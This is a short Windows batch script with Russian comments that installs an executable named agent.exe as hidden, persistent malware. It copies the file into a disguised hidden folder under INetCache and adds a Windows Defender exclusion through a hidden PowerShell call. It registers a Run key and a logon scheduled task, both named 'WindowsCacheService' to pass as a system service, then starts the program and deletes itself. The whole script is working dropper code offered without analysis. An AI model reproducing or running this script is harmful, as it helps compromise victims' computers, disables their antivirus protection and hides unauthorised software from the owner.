@echo off
:: Фиксируем реальный путь к TEMP
set "TEMP_DIR=%TEMP%"
set "targetDir=%LOCALAPPDATA%\Microsoft\Windows\INetCache\Cache"

:: Создаём папку
if not exist "%targetDir%" mkdir "%targetDir%"
attrib +h "%targetDir%" >nul 2>&1

:: Копируем agent.exe ИЗ ТОЙ ЖЕ ПАПКИ ГДЕ ЛЕЖИТ БАТНИК (%~dp0)
copy /Y "%~dp0agent.exe" "%targetDir%\agent.exe" >nul 2>&1
attrib +h "%targetDir%\agent.exe" >nul 2>&1

:: Defender
powershell -NoP -NonI -W Hidden -Command "Add-MpPreference -ExclusionPath '%targetDir%' -Force" >nul 2>&1

:: Реестр
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsCacheService" /t REG_SZ /d "\"%targetDir%\agent.exe\"" /f >nul 2>&1

:: Планировщик
schtasks /create /tn "WindowsCacheService" /tr "\"%targetDir%\agent.exe\"" /sc ONLOGON /f >nul 2>&1

:: Запуск
start "" /B "%targetDir%\agent.exe"

:: Самоуничтожение
ping 127.0.0.1 -n 2 >nul
del "%~f0" >nul 2>&1
exit